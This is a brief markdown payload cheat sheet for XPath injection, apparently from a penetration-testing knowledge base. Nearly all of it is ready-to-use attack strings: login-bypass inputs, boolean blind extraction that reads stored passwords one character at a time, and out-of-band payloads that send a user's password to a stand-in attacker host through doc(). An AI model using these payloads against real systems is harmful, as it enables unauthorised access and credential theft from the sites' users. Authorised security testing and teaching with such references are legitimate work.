---
title: "Payloads: XPath Injection"
type: payloads
tags: [payloads, xpath, injection, xml, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: XPath Injection

Inject into XPath queries over XML (OWASP A03). Routed via the `hunt-injection` skill. See [[xpath-injection]].

## Detect
```
'        "        or        and        ]        )
# single quote -> XPath error or changed results = injectable
```

## Auth bypass
```
' or '1'='1          ' or ''='          x' or 1=1 or 'x'='y
admin' or '1'='1' or 'a'='a
') or ('1'='1        ' or name()='username' or 'x'='y
@*    //*    count(/child::node())
```

## Blind extraction (boolean)
```
' and string-length(//user[1]/password)=8 and '1'='1     # length
' and substring(//user[1]/password,1,1)='a' and '1'='1   # char by char
' and substring(//user[1]/password,POS,1)=codepoints-to-string(ORD) and '1'='1
# enumerate node names:
' and name(/*[1])='users' and '1'='1
```

## Out-of-band (if doc() supported)
```
' and doc('//attacker/share') or '1'='1
' and doc(concat('http://oob/',encode-for-uri(//user[1]/password))) or '1'='1
```

## Real-world
Legacy SOAP/XML auth and XML-stored user DBs; `' or '1'='1` style bypass and char-by-char blind extraction dump the whole document (no privilege model in XPath). Often pairs with [[xxe]] on the same endpoint.
